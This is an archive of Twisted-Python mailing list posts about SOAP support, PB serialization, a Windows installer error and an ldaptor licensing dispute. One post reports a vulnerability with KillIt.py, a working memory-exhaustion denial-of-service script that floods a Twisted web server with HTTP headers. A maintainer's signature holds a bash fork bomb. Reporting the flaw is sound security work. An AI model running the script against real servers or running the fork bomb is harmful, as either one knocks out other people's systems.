From michal at sabren.com  Tue Jul  1 08:15:51 2003
From: michal at sabren.com (Michal Wallace)
Date: Tue, 1 Jul 2003 08:15:51 -0400 (EDT)
Subject: [Twisted-Python] twistedMoin ?
In-Reply-To: <0257A723-AB73-11D7-A92B-000393C9700E@twistedmatrix.com>
Message-ID: <Pine.LNX.4.44.0307010810530.486-100000@hydrogen.sabren.com>

On Mon, 30 Jun 2003, Glyph Lefkowitz wrote:

> On Monday, June 30, 2003, at 09:02 PM, Itamar Shtull-Trauring wrote:
> 
> > Are you sure it's not people running moin as a CGI? That's what
> > twistedmatrix.com does.
> 
> Considering that the CGI support in Twisted was developed for MoinMoin 
> and Mailman, and almost all the bugfixes that made it stable were from 
> MoinMoin's maintainer, you could even say that MoinMoin+Twisted CGI 
> *is* "Twisted-enabled" MoinMoin :)

Ah, I see now. One of my customers is 
running MoinMoin on apache right now, and 
getting a TON of traffic, so I was hoping 
to switch to a non-forking version based
on twisted.

There's actually a twistedMoin.py in the 
MoinMoin distribution that works about
half way - I got a twisted server with an
embedded MoinMoin running, but there are
still some objects lying around that want
to grab state out of a global area instead
of passing the information in through a 
request object. (Unfortunately, one of
those is the bit that decides what page 
we're looking at.) I may wind up finishing
the job myself, but I thought I'd ask 
around first. :)

Sincerely,
 
Michal J Wallace
Sabren Enterprises, Inc.
-------------------------------------
contact: michal at sabren.com
hosting: http://www.cornerhost.com/
my site: http://www.withoutane.com/
--------------------------------------





From 2002 at weholt.org  Tue Jul  1 08:46:19 2003
From: 2002 at weholt.org (Thomas Weholt ( PRIVAT ))
Date: Tue, 1 Jul 2003 14:46:19 +0200
Subject: [Twisted-Python] Importing twisted.web.soap raises an exception
Message-ID: <001701c33fce$c49f4150$3ba8a8c0@gatsoft.no>

Trying to use twisted.web.soap raises an exception, saying it cannot import
SOAP-module. Why isn't this module in the distribution and where is it
located? I'm using Twisted 1.0.6.

Best regards,
Thomas




From andrew-twisted at puzzling.org  Tue Jul  1 08:54:33 2003
From: andrew-twisted at puzzling.org (Andrew Bennetts)
Date: Tue, 1 Jul 2003 22:54:33 +1000
Subject: [Twisted-Python] Importing twisted.web.soap raises an exception
In-Reply-To: <001701c33fce$c49f4150$3ba8a8c0@gatsoft.no>
References: <001701c33fce$c49f4150$3ba8a8c0@gatsoft.no>
Message-ID: <20030701125433.GB17479@frobozz>

On Tue, Jul 01, 2003 at 02:46:19PM +0200, Thomas Weholt ( PRIVAT ) wrote:
> Trying to use twisted.web.soap raises an exception, saying it cannot import
> SOAP-module. Why isn't this module in the distribution and where is it
> located? I'm using Twisted 1.0.6.

As the docstring of t.w.soap says: "Requires SOAPpy."

You can find it at http://pywebsvcs.sf.net/, although I think you need to
comment out these lines in t.w.soap to make the latest version work:

    # fix 2.2 issues with SOAP
    SOAP.SOAPBuilder.dump_str = SOAP.SOAPBuilder.dump_string
    SOAP.SOAPBuilder.dump_dict = SOAP.SOAPBuilder.dump_dictionary

The docstring should probably updated to include a URL, and those lines
removed to reflect the current stable version of SOAPpy...

-Andrew.




From 2002 at weholt.org  Tue Jul  1 09:47:20 2003
From: 2002 at weholt.org (Thomas Weholt ( PRIVAT ))
Date: Tue, 1 Jul 2003 15:47:20 +0200
Subject: [Twisted-Python] Importing twisted.web.soap raises an exception
References: <001701c33fce$c49f4150$3ba8a8c0@gatsoft.no> <20030701125433.GB17479@frobozz>
Message-ID: <000501c33fd7$4b25e8c0$3ba8a8c0@gatsoft.no>

Ok, it seems to be imported without errors now, but I had to change the line

import SOAP

to

import SOAPpy as SOAP

to make it work. Tried it with SOAPpy 0.10.1.

Still, it's listed as unstable. Does anybody have any comments on the
usability of this module besides that?

Thomas


----- Original Message -----
From: "Andrew Bennetts" <andrew-twisted at puzzling.org>
To: <twisted-python at twistedmatrix.com>
Sent: Tuesday, July 01, 2003 2:54 PM
Subject: Re: [Twisted-Python] Importing twisted.web.soap raises an exception


> On Tue, Jul 01, 2003 at 02:46:19PM +0200, Thomas Weholt ( PRIVAT ) wrote:
> > Trying to use twisted.web.soap raises an exception, saying it cannot
import
> > SOAP-module. Why isn't this module in the distribution and where is it
> > located? I'm using Twisted 1.0.6.
>
> As the docstring of t.w.soap says: "Requires SOAPpy."
>
> You can find it at http://pywebsvcs.sf.net/, although I think you need to
> comment out these lines in t.w.soap to make the latest version work:
>
>     # fix 2.2 issues with SOAP
>     SOAP.SOAPBuilder.dump_str = SOAP.SOAPBuilder.dump_string
>     SOAP.SOAPBuilder.dump_dict = SOAP.SOAPBuilder.dump_dictionary
>
> The docstring should probably updated to include a URL, and those lines
> removed to reflect the current stable version of SOAPpy...
>
> -Andrew.
>
>
> _______________________________________________
> Twisted-Python mailing list
> Twisted-Python at twistedmatrix.com
> http://twistedmatrix.com/cgi-bin/mailman/listinfo/twisted-python
>
>




From pb_twisted at olga.mine.nu  Tue Jul  1 09:58:34 2003
From: pb_twisted at olga.mine.nu (Patrik Blommaskog)
Date: Tue, 1 Jul 2003 15:58:34 +0200
Subject: [Twisted-Python] Controlling the classes being Jellied
Message-ID: <JAEDJDIBADCJHPFLNEDFAEELCAAA.pb_twisted@olga.mine.nu>

I'm using PB and want to accomplish something like this:

On the server, I have the following class hierarchy:

    Actor(pb.Copyable)
  
    GoodActor(Actor)
    BadActor(Actor)
    ...
    WhateverActor(Actor)

There exists a number of instances of each of these classes.

When Jellying them over to the client, I want each of them to create 
instances of the client class RemoteActor, no matter which of the server 
classes they are of. In practice, the different server classes will 
generate different state data that is transmitted to the client, where 
that state data just updates __dict__ , at least for now.

There are two things I would need input on how to accomplish:

1. I don't want to put the code for any of the server classes on the 
client just for the unjellying mapping, as they do in the PB examples. I 
think I am looking for a way to associate a class name, rather than the 
class itself, with a client-side class. E.g. { "Actor" : RemoteActor } 
instead of { Actor : RemoteActor ].

2. I would like all server classes derived from Actor be identified as 
being of class Actor when Jellied. The client should not need to know 
about any server-side child classes at all. They may not even exist at 
the time when the client is distributed.

I'd appreciate any pointers on how to do this, and also any hints if I 
seem to be thinking in the wrong direction.


- Patrik




From itamar at itamarst.org  Tue Jul  1 12:24:31 2003
From: itamar at itamarst.org (Itamar Shtull-Trauring)
Date: Tue, 1 Jul 2003 12:24:31 -0400
Subject: [Twisted-Python] Importing twisted.web.soap raises an exception
In-Reply-To: <000501c33fd7$4b25e8c0$3ba8a8c0@gatsoft.no>
References: <001701c33fce$c49f4150$3ba8a8c0@gatsoft.no>
	<20030701125433.GB17479@frobozz>
	<000501c33fd7$4b25e8c0$3ba8a8c0@gatsoft.no>
Message-ID: <20030701122431.09d3cb73.itamar@itamarst.org>

On Tue, 1 Jul 2003 15:47:20 +0200
"Thomas Weholt \( PRIVAT \)" <2002 at weholt.org> wrote:

> Still, it's listed as unstable. Does anybody have any comments on the
> usability of this module besides that?

I seemed to work when I wrote it, but I dunno how interoperable SOAPpy
is.

I will try to fix it up to work with latest version, and add client
support and tests; today, or sometime this week.

In general, btw, I would recommend using XML-RPC rather than SOAP unless
you have a specific reason not to.



From dalke at dalkescientific.com  Tue Jul  1 13:52:07 2003
From: dalke at dalkescientific.com (Andrew Dalke)
Date: Tue, 1 Jul 2003 19:52:07 +0200
Subject: [Twisted-Python] ANN: Twisted 1.0.6 (includes security fixes)
In-Reply-To: <20030628235814.41d95bdc.itamar@itamarst.org>
Message-ID: <BB6429C7-ABEC-11D7-A2A0-000393C92466@dalkescientific.com>

Itamar Shtull-Trauring:
>    IMPORTANT: This release includes security updates to twisted.web.
>    It is strongly recommended that you upgrade to this version of
>    Twisted.
>

> What's New in 1.0.6
> ===================
>
> - Security fixes for twisted.web.

Was the out-of-memory denial of service attack fixed?

    
http://www.twistedmatrix.com/pipermail/twisted-python/2003-June/ 
004462.html

Looking at the code, it looks like I can still keep adding headers
until the machine exhausts memory

     def headerReceived(self, line):
         """Do pre-processing (for content-length) and store this header  
away.
         """
         header, data = line.split(':', 1)
         header = header.lower()
         data = data.strip()
         if header == 'content-length':
             self.length = int(data)
         self.requests[-1].received_headers[header] = data

					Andrew
					dalke at dalkescientific.com




From dalke at dalkescientific.com  Tue Jul  1 14:04:52 2003
From: dalke at dalkescientific.com (Andrew Dalke)
Date: Tue, 1 Jul 2003 20:04:52 +0200
Subject: [Twisted-Python] ANN: Twisted 1.0.6 (includes security fixes)
In-Reply-To: <BB6429C7-ABEC-11D7-A2A0-000393C92466@dalkescientific.com>
Message-ID: <8337B969-ABEE-11D7-A2A0-000393C92466@dalkescientific.com>

Me:
> Was the out-of-memory denial of service attack fixed?
>
>    
> http://www.twistedmatrix.com/pipermail/twisted-python/2003-June/ 
> 004462.html

Err, that code doesn't actually work (it reuses the same header names,
so there isn't a memory problem).  Here's some real attack code

===== KillIt.py
import socket
class KillIt:
   def __init__(self, where):
     self.f = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     self.f.connect(where)
     self.f.send("GET / HTTP/1.1\r\n")
     self.n = 0
   def kill(self):
     factor = 1000000
     for i in range(self.n*factor, (self.n+1)*factor):
       self.f.send("%s: X\r\n" % i)
       if i%1000 == 0: print i
     self.n += 1

=======


 >>> import KillIt
 >>> server = KillIt.KillIt( ("localhost", 8080) )
 >>> server.kill()
  ... lots of output showing that it's dumping headers ...
 >>> server.kill()
  ... each invocation takes about 50MB or so
 >>> server.kill()
  ... repeat until desired ...


					Andrew





From itamar at itamarst.org  Tue Jul  1 14:14:29 2003
From: itamar at itamarst.org (Itamar Shtull-Trauring)
Date: Tue, 1 Jul 2003 14:14:29 -0400
Subject: [Twisted-Python] ANN: Twisted 1.0.6 (includes security fixes)
In-Reply-To: <BB6429C7-ABEC-11D7-A2A0-000393C92466@dalkescientific.com>
References: <20030628235814.41d95bdc.itamar@itamarst.org>
	<BB6429C7-ABEC-11D7-A2A0-000393C92466@dalkescientific.com>
Message-ID: <20030701141429.3165b8dc.itamar@itamarst.org>

On Tue, 1 Jul 2003 19:52:07 +0200
Andrew Dalke <dalke at dalkescientific.com> wrote:

> Was the out-of-memory denial of service attack fixed?

No, we fixed a more serious security bug :/

Going through http code and fixing all the DoS issues is on my todo
list.


-- 
Itamar Shtull-Trauring    http://itamarst.org/
http://www.zoteca.com -- Python & Twisted consulting



From cce at clarkevans.com  Tue Jul  1 23:27:44 2003
From: cce at clarkevans.com (Clark C. Evans)
Date: Wed, 2 Jul 2003 03:27:44 +0000
Subject: [Twisted-Python] ldaptor feedback
Message-ID: <20030702032744.GA80790@doublegemini.com>

Tommi,

Howdy.  Thank you for your initial help with ldaptor; it looks like
I'll be spending alot of time on LDAP in the next few months.

1.  I would like to see ldap in twisted proper, it is really a
    core protocol (like imap, etc.).   From what I heared there are
    two arguments against, size and licensing.

    As for size, I think that LDAP is so important that it really
    belongs in twisted.   It is at the same level as IMAP.   I do not
    want to have to go to an external module, hence LDAP is in-scope
    so the size argument does not matter to me.

    As for licensing, I understand your concerns.  However, it is very
    important for enforcement of copyright and for the ability to 'fix'
    the license that a single entity have the ability to license the
    and enforce the work as needed.    Long term I'd like to see Glyph
    form some sort of non-profit to hold the copyrights, or at the
    very least present a 'will' of sorts describing what happens to
    the copyrights in the event that he is incapacitated or gets 
    hit by a MAC truck.    For now, I'm not too worried about this.
    As for Glyph selling the software and making a profit... well, 
    as a bunch of individual packages this just is not an option at
    all, so better someone than no one.   But seriously, I trust that
    Glyph will spread the wealth to those who have really contributed
    to Twisted, perhaps by simply paying for Flights and Hotels for
    Python/Twisted conference if he ever makes bank with the copyright.
    In reality though, I think that this is a moot point; the most 
    important point is the ability to fix the copyright and pursue
    violators... without copyright powers this is too hard.
    
    So, Glyph approving, would you consider contributing ldaptor
    to twisted?

2.  Your package hierarchy needs help... lots of help.
   
    Let's start with this example... 

    from ldaptor.protocols.ldap.ldapsyntax import LDAPJournalOperation_Replace

    Arg!  First, ldaptor has one protocol... ldap.  So "protocols.ldap" is
    quite redundant.  Second, ldapsyntax is describing a ldap proxy 
    object with the ability to journal its changes and save.  It has
    nothing to do with "syntax" let alone "ldapsyntax", how about 
    'object' or 'proxy'?.  Third, I count 3 occurances of LDAP... Uncle!  
    Fourth, the class name is *huge* and using prefixes this way sucks, 
    JournalOperations should be in a file called 'journal'.    In short, 
    what I'd want to see...

       from ldaptor import ldap
       op = ldap.journal.Replace()

    The 'low-level' pureber and pureldap are really not protocol
    items so much as they are parsers/emitters.  You could stuff
    these, as well as the filter, ldif, and schema all into 
    another part of ldaptor, ldaptor.parse.ldif, etc.

    Anyway, for ldaptor to be understandable it really needs a 
    refactor like this.   Just look at your commands as to how
    ugly the packaging is.   Good packaging and naming takes quite
    a bit of effort and thought.

3.  I can help convert your public interfaces to use Deferreds, and I 
    can rewrite your examples to use flow (so that they are more
    readable).    In particular, I was playing with a flow version
    of your ldap client and it makes things quite clean; to use
    the client you have a generator which yield ldap commands...

    If I'm to help, I'll need commit access and you can't be 
    completely opposed to me restructuring/commenting things as
    I move along.   If you need an example of my work, see flow.py

Anyway, I'm curious how open you are to these items.   Adding this to
Twisted (with alot of work) is probably a good bargin; you get more
eyes helping your project along, documentation, etc.  

Best,

Clark



From illumen at yahoo.com  Wed Jul  2 02:06:04 2003
From: illumen at yahoo.com (Rene Dudfield)
Date: Wed, 02 Jul 2003 16:06:04 +1000
Subject: [Twisted-Python] windows binary install.
In-Reply-To: <20030702032744.GA80790@doublegemini.com>
References: <20030702032744.GA80790@doublegemini.com>
Message-ID: <3F02764C.3010600@yahoo.com>

Hello,

I tried to install the windows binary install today, and there was an error.

Is it possible to not require win32api?  Maybe win32api should be on a 
list of dependencies on the download page?


Here's the error:
Installing Icons for Twisted...
Traceback (most recent call last):
File "C:\Python22\Scripts\twisted_postinstall.py", line 269, in ?
      run()
        File "C:\Python22\Scripts\twisted_postinstall.py", line 70, in run
            whocares=install()
              File "C:\Python22\Scripts\twisted_postinstall.py", line 
179, in install
                  if not runtime.platform.isWinNT():
                    File 
"C:\Python22\Lib\site-packages\twisted\python\runtime.py", line 52, in 
isWinNT
                        import win32api, win32con
                        ImportError: No module named win32api
                        *** run_installscript: internal error 0xFFFFFFFF ***






From tv at twistedmatrix.com  Wed Jul  2 02:35:20 2003
From: tv at twistedmatrix.com (Tommi Virtanen)
Date: Wed, 2 Jul 2003 09:35:20 +0300
Subject: [Twisted-Python] ldaptor feedback
In-Reply-To: <20030702032744.GA80790@doublegemini.com>
References: <20030702032744.GA80790@doublegemini.com>
Message-ID: <20030702063520.GA24397@lapdog>

On Wed, Jul 02, 2003 at 03:27:44AM +0000, Clark C. Evans wrote:
> 1.  I would like to see ldap in twisted proper, it is really a
>     core protocol (like imap, etc.).   From what I heared there are
>     two arguments against, size and licensing.
> 
>     As for size, I think that LDAP is so important that it really
>     belongs in twisted.   It is at the same level as IMAP.   I do not
>     want to have to go to an external module, hence LDAP is in-scope
>     so the size argument does not matter to me.

	IMAP is <4200 lines with tests, and I believe it is expected
	to be pretty complete protocol, including client and server
	sides. Ldaptor is already almost three times that big,
	client-only, and is still only scratching the surface.

	LDAP is not really used commonly enough to bloat the twisted
	core with it. (Quick! Name three end user applications using
	LDAP!)

	If you think installing two libraries instead of one is too
	hard, you need to get a better OS ;)

>     As for licensing, I understand your concerns.  However, it is very
>     important for enforcement of copyright and for the ability to 'fix'
>     the license that a single entity have the ability to license the
>     and enforce the work as needed.    Long term I'd like to see Glyph
>     form some sort of non-profit to hold the copyrights, or at the
>     very least present a 'will' of sorts describing what happens to
>     the copyrights in the event that he is incapacitated or gets 
>     hit by a MAC truck.    For now, I'm not too worried about this.

	I think we as the community don't need anything better than
	LGPL.

>     As for Glyph selling the software and making a profit... well, 
>     as a bunch of individual packages this just is not an option at
>     all, so better someone than no one.

	I don't feel that way. And most of all, I am not willing to
	delegate that power when it comes to my creation.

	Besides, glyph's major point on that was the game industry.
	I'm betting they will not be interested in LDAP.

>     So, Glyph approving, would you consider contributing ldaptor
>     to twisted?

	No, you are missing the point. That was the starting point;
	if I had been happy with that I would never have moved the
	code from Twisted to Ldaptor.

> 2.  Your package hierarchy needs help... lots of help.

	Agreed.

>     Let's start with this example... 
> 
>     from ldaptor.protocols.ldap.ldapsyntax import LDAPJournalOperation_Replace
>
>     Arg!

	You never do that.

	1. s/from foo.bar import OneClass/from foo import bar/

	2. users of the API never need to touch LDAPJournalOperations,
	   or even the journal itself.

	The current situation looks more like

	from ldaptor.protocol.ldap import ldapsyntax

	o = ldapsyntax.LDAPObject(..)

	which is within the limits of what my emacs is willing to
	dabbrev-expand. Most of the time you just do things like

	d = o.search(...)
	d.addCallback(foo)

>     First, ldaptor has one protocol... ldap.  So "protocols.ldap" is
>     quite redundant.

	There's likely to be LDAPv4. LDAP protocol versions aren't really
	compatible.

	I think LDIF-as-a-replication format is a protocol.

	There's LDUP, the LDAP replication protocol, but that's probably
	just a superset of LDAPv3.

	I think I may end up supporting LDAP-over-UDP, if the standard
	is stable.

	What's really making you grit your teeth is that the mechanism
	an LDAP client uses to open a connection to an LDAP server should
	be in ldaptor.client; and it will be, once I have a clear idea
	what the API should look like. For now, you need to make your own
	subclass of ldapclient.LDAPClient, a Protocol, even if you
	only override *1* method of it! And, remember what I said, everything
	in ldapclient is the old, ugly, API.

	In the future, it'll look more like

	from ldaptor import client

	d=client.openDN('dc=example,dc=com')
	d.addCallback(lambda o: o.search('cn=foo'))

	and you won't need to import the low-level things.

>     Second, ldapsyntax is describing a ldap proxy 
>     object with the ability to journal its changes and save.  It has
>     nothing to do with "syntax" let alone "ldapsyntax", how about 
>     'object' or 'proxy'?.

	Yes, the word syntax is bad. It dates back to the time I tried to
	make the data in LDAP be manipulatable as Python objects, from the
	days before Twisted.

	I refuse to name a class "Object". I refuse to name a class
	"Proxy".

	Besides, I'm a TCP/IP person. To me, a proxy is a thing that
	intermediates between two (different or the same) protocols,
	not something that is really a client-side state for a
	networking API.

>     Third, I count 3 occurances of LDAP... Uncle!

	You purposefully imported the lowest-level thing you could find.
	I could care less how ugly that seems to you. You are not supposed
	to touch that. Internal consistency matters more than shortness
	of the names.

>     Fourth, the class name is *huge* and using prefixes this way sucks, 
>     JournalOperations should be in a file called 'journal'.    In short, 
>     what I'd want to see...
> 
>        from ldaptor import ldap
>        op = ldap.journal.Replace()

	Class named Replace? That way leads to insanity, IMHO.
	What does it replace? With what? Where? Remember, you are
	talking about an implementation detail users of the library
	should never see.

>     The 'low-level' pureber and pureldap are really not protocol
>     items so much as they are parsers/emitters.  You could stuff
>     these, as well as the filter, ldif, and schema all into 
>     another part of ldaptor, ldaptor.parse.ldif, etc.

	There are two things in a protocol:

	1. the wire representation of things
		ldaptor.protocols.pureber
		ldaptor.protocols.pureldap

	2. the state machine
		ldaptor.protocols.ldap.ldapclient
		ldaptor.protocols.ldap.ldapsyntax

	(often #1 is so simple it's not implemented separately)

	The wire representation of the LDAP messages is never
	written to a file, so there's no use for it outside of
	the protocol scope.

	Filter and ldif need to move some day. They started life
	as residing inside the neighbouring .py files, and were
	split out when they grew too big; moving them should be
	reasonably trivial.

	schema needs to be split into pure-ASCII-parser
	(ldaptor.schema?) and the state machine to fetch the used
	schema from the server over LDAP (which should be refactored
	to use LDAPObjects).

>     Anyway, for ldaptor to be understandable it really needs a 
>     refactor like this.   Just look at your commands as to how
>     ugly the packaging is.   Good packaging and naming takes quite
>     a bit of effort and thought.

	Agreed.

> 3.  I can help convert your public interfaces to use Deferreds, and I 
>     can rewrite your examples to use flow (so that they are more
>     readable).    In particular, I was playing with a flow version
>     of your ldap client and it makes things quite clean; to use
>     the client you have a generator which yield ldap commands...

	Thank you for that.

	Please, no flow rewrites for Ldaptor as of now; when flow has
	been in use in Twisted core protocols for ~ 3 months, we can
	talk again.

>     If I'm to help, I'll need commit access and you can't be 
>     completely opposed to me restructuring/commenting things as
>     I move along.   If you need an example of my work, see flow.py

	I think we got a good start on that in IRC.

	I hope to make ldaptor cleaner and clearer. Any help from
	you is welcome.

	Of course, I still get to review your changes and bitch about
	them ;)

> Anyway, I'm curious how open you are to these items.   Adding this to
> Twisted (with alot of work) is probably a good bargin; you get more
> eyes helping your project along, documentation, etc.  

	I have long hoped for some other developers to share the work.

	But no, I will not donate >10000 lines of my work to glyph.
	I'm too much a free software bigot; I want to force him to
	the rules of LGPL. Just like everyone else. In fact, that's
	why I still consider him to have a partial copyright on Ldaptor,
	even though he wrote none of it; that makes _me_ faithful to
	the LGPL, too. And that's a good thing.

	Oh, by the way, you are horribly naive for thinking that
	merely having the code located in the Twisted CVS makes
	everyone else maintain it. That just isn't the way things
	have happened. LDAP is not a core protocol for most people.

-- 
:(){ :|:&};:



From cce at clarkevans.com  Wed Jul  2 04:07:48 2003
From: cce at clarkevans.com (Clark C. Evans)
Date: Wed, 2 Jul 2003 08:07:48 +0000
Subject: [Twisted-Python] ldaptor feedback
In-Reply-To: <20030702063520.GA24397@lapdog>
References: <20030702032744.GA80790@doublegemini.com> <20030702063520.GA24397@lapdog>
Message-ID: <20030702080748.GA81663@doublegemini.com>

Hello Tommi.   Thank you for taking time to respond.

On Wed, Jul 02, 2003 at 09:35:20AM +0300, Tommi Virtanen wrote:
| 	LDAP is not really used commonly enough to bloat the twisted
| 	core with it. (Quick! Name three end user applications using
| 	LDAP!)

I think LDAP is pretty cornerstone to any internet application
where 'single sign on' and other directory information is 
required.   If it was available, I even picture game servers
or muds using it... 

| >     Long term I'd like to see Glyph form some sort of non-profit to 
| >     hold the copyrights, or at the very least present a 'will' of 
| >     sorts describing what happens to the copyrights in the event 
| >     that he is incapacitated or gets hit by a MAC truck.    For 
| >     now, I'm not too worried about this.
| 
| 	I think we as the community don't need anything better than
| 	LGPL.

Although the legal environment for open source moves quite slowly,
it is certainly not static; thus changes may be required down the
road (think 5-15 years) and furthermore, to enforce the license you
have to have an coordinated entity to do this.   If the code comes
from a hodge-podge of developers, most of whom can't be contacted,
it makes enforcement impossible.

Another problem that is on the horizion is is alot of FUD and
uncertainty by corporations in using open source beacuse it is
hard to track down who owned what modules, etc.   Unless we do
this in an organized manner, it doesn't matter what license
we put at the top of the file; wide spread adoption will be
hindered.  Alas, this is probably the wrong list for this sort
of discussion; perhaps we need a twisted-legal (for licensing, 
and other legal stuff)

| > 2.  Your package hierarchy needs help... lots of help.
| 
| 	Agreed.

Cool.

| 	The current situation looks more like
| 
| 	from ldaptor.protocol.ldap import ldapsyntax
| 
| 	o = ldapsyntax.LDAPObject(..)

Ok.   

| >     First, ldaptor has one protocol... ldap.  So "protocols.ldap" is
| >     quite redundant.
| 
| 	There's likely to be LDAPv4. LDAP protocol versions aren't really
| 	compatible.

All the more reason to not prefix in class names. ;)

   from ldaptor import ldap3 as ldap
   ent = ldap.client(...)

   // 3 years from now

   from ldaptor import ldap4 as ldap
   ent = ldap.client(...)


And hopefully the interface can be the same, if not, it will
raise an error.   (ie, there may be xtra constructor arguments 
available in ldap4.Entry

| 	What's really making you grit your teeth is that the mechanism
| 	an LDAP client uses to open a connection to an LDAP server should
| 	be in ldaptor.client; and it will be, once I have a clear idea
| 	what the API should look like.

Yes!  And sorry that the griding teeth is so visible.  ;)

| 	from ldaptor import client
| 
| 	d=client.openDN('dc=example,dc=com')
| 	d.addCallback(lambda o: o.search('cn=foo'))

Nice.  

| 	Yes, the word syntax is bad. It dates back to the time I tried to
| 	make the data in LDAP be manipulatable as Python objects, from the
| 	days before Twisted.
| 
| 	I refuse to name a class "Object". I refuse to name a class
| 	"Proxy".

After reading the RFC, it seems that "entry" is most often used
to mean an object in the LDAP database.  

| >     The 'low-level' pureber and pureldap are really not protocol
| >     items so much as they are parsers/emitters.  You could stuff
| >     these, as well as the filter, ldif, and schema all into 
| >     another part of ldaptor, ldaptor.parse.ldif, etc.
| 
| 	There are two things in a protocol:
| 
| 	1. the wire representation of things
| 		ldaptor.protocols.pureber
| 		ldaptor.protocols.pureldap
| 
| 	2. the state machine
| 		ldaptor.protocols.ldap.ldapclient
| 		ldaptor.protocols.ldap.ldapsyntax
| 
| 	The wire representation of the LDAP messages is never
| 	written to a file, so there's no use for it outside of
| 	the protocol scope.

Right.   And I'd just like to see the opposite:

        1.  state machine

             ldaptor.protocols.ldap3.client
             ldaptor.protocols.ldap3.server
      
        2. wire format

             ldaptor.protocols.ldap3.wire.ber
             ldaptor.protocols.ldap3.wire.request

| 	Filter and ldif need to move some day. They started life
| 	as residing inside the neighbouring .py files, and were
| 	split out when they grew too big; moving them should be
| 	reasonably trivial.

Ok.

| > Anyway, I'm curious how open you are to these items.   Adding this to
| > Twisted (with alot of work) is probably a good bargin; you get more
| > eyes helping your project along, documentation, etc.  
| 
| 	I have long hoped for some other developers to share the work.

I'm a painful one.  ;)

| 	But no, I will not donate >10000 lines of my work to glyph.
| 	I'm too much a free software bigot; I want to force him to
| 	the rules of LGPL. Just like everyone else. In fact, that's
| 	why I still consider him to have a partial copyright on Ldaptor,
| 	even though he wrote none of it; that makes _me_ faithful to
| 	the LGPL, too. And that's a good thing.

I will let Glyph respond to this when he has time.  I do think that
there is quite a deep mis-understanding here, hopefully this will
resolve it self shortly.  

| 	Oh, by the way, you are horribly naive for thinking that
| 	merely having the code located in the Twisted CVS makes
| 	everyone else maintain it. That just isn't the way things
| 	have happened. LDAP is not a core protocol for most people.

Well.  Since flow has been added (to the sandbox), I've received 
over 10 patches, several of them non-trivial and even two that 
extended functionality. I never expected this, but it happened.  
A few patches were even done without asking me (thank god) beacuse
they were so clearly wrong.    This is really the beauty of open
source software; the community does really take ownership of the
code.   I'm not saying that there isn't a primary 'author', but
I am saying that maintanence does get distributed.

Also, I think that you are completely wrong about LDAP not
being core.  It is just a matter of time.   LDAP is barely
6 years old now...  it takes at least 5 years for broad 
adoption... more like 10.   LDAP has a long way to go, and
something like ldaptor in twisted could make it go much
further.   Further, having ldap in twisted will allow other
packages to tightly integrate with ldap (for instance, the
imap server via cred), etc.

Best,

Clark



From 2002 at weholt.org  Wed Jul  2 03:52:18 2003
From: 2002 at weholt.org (Thomas Weholt ( PRIVAT ))
Date: Wed, 2 Jul 2003 09:52:18 +0200
Subject: [Twisted-Python] Verbose example of how to use Cred in WebPages ?
Message-ID: <000901c3406e$dc59f8d0$3ba8a8c0@gatsoft.no>

Hi,

Could someone give me a verbose example of how to control access to webpages
using Twisted? How to define users and their access rights etc. Probaly
using Cred or Guard or something, but I don't know what and how.

Regards,
Thomas




From warner at lothar.com  Wed Jul  2 04:59:03 2003
From: warner at lothar.com (Brian Warner)
Date: Wed, 02 Jul 2003 01:59:03 -0700 (PDT)
Subject: [Twisted-Python] Controlling the classes being Jellied
References: <JAEDJDIBADCJHPFLNEDFAEELCAAA.pb_twisted@olga.mine.nu>
Message-ID: <20030702.015903.06353698.warner@lothar.com>

"Patrik Blommaskog" <pb_twisted at olga.mine.nu> writes:

> I'm using PB and want to accomplish something like this:
> 
> On the server, I have the following class hierarchy:
> 
>     Actor(pb.Copyable)
>   
>     GoodActor(Actor)
>     BadActor(Actor)
>     ...
>     WhateverActor(Actor)
> 
> There exists a number of instances of each of these classes.
> 
> When Jellying them over to the client, I want each of them to create 
> instances of the client class RemoteActor, no matter which of the server 
> classes they are of. In practice, the different server classes will 
> generate different state data that is transmitted to the client, where 
> that state data just updates __dict__ , at least for now.

You probably want something like this on the sending side:
  
  class Actor(pb.Copyable):
    def getTypeToCopy(self):
      return "package.module.Actor"
  
  class GoodActor(Actor):
    def getStateToCopy(self):
      return good_dict
  
  class BadActor(Actor):
    def getStateToCopy(self):
      return bad_dict

and then the receiving side can just do:
  
  class RemoteActor(pb.RemoteCopy):
    ...
  
  pb.setUnjellyableForClass("package.module.Actor", RemoteActor)


The two important points are:

 1: by overriding .getTypeToCopy(), the sending class can control what class
    name is put into the serialized stream.

 2: pb.setUnjellyableForClass maps a name (the one in the serialized stream)
    to a local class. The name can be specified either as a string or as a
    class. If you don't have access to the the class, just use a string that
    matches the one used by the sender. The only caveat is to make sure the
    string is unique with respect to packages and modules and such.. in
    general is should be a "fully qualified" class name.


Hope that helps.. let me know if you've got more questions. I think we could
use an example of this (string-based jellied class names instead of classes
shared between sender and recipient) in the docs.

cheers,
 -Brian



From tv at twistedmatrix.com  Wed Jul  2 10:03:22 2003
From: tv at twistedmatrix.com (Tommi Virtanen)
Date: Wed, 2 Jul 2003 17:03:22 +0300
Subject: [Twisted-Python] windows binary install.
In-Reply-To: <3F02764C.3010600@yahoo.com>
References: <20030702032744.GA80790@doublegemini.com> <3F02764C.3010600@yahoo.com>
Message-ID: <20030702140322.GB10309@lapdog>

On Wed, Jul 02, 2003 at 04:06:04PM +1000, Rene Dudfield wrote:
> Hello,

	Please don't reply to existing threads when you start a new
	topic; just send a new (non-reply) email to
	twisted-python at twistedmatrix.com.

-- 
:(){ :|:&};:



From tv at twistedmatrix.com  Wed Jul  2 10:28:38 2003
From: tv at twistedmatrix.com (Tommi Virtanen)
Date: Wed, 2 Jul 2003 17:28:38 +0300
Subject: [Twisted-Python] ldaptor feedback
In-Reply-To: <20030702080748.GA81663@doublegemini.com>
References: <20030702032744.GA80790@doublegemini.com> <20030702063520.GA24397@lapdog> <20030702080748.GA81663@doublegemini.com>
Message-ID: <20030702142838.GC10309@lapdog>

On Wed, Jul 02, 2003 at 08:07:48AM +0000, Clark C. Evans wrote:
> | 	LDAP is not really used commonly enough to bloat the twisted
> | 	core with it. (Quick! Name three end user applications using
> | 	LDAP!)
> I think LDAP is pretty cornerstone to any internet application
> where 'single sign on' and other directory information is 
> required.   If it was available, I even picture game servers
> or muds using it... 

	You mean you hope it will be? (Quick! Name three end user
	applications using LDAP!)

	LDAP is an ugly, broken, horrible non-unixy non-internetty
	protocol conceived by the folk who gave you such marvels as
	X.25. I hope LDAP dies screaming.

	On the other hand, I need something to do the things LDAP
	is used at. And, for now, it seems the evolution path
	goes through first implementing LDAP, and then improving it
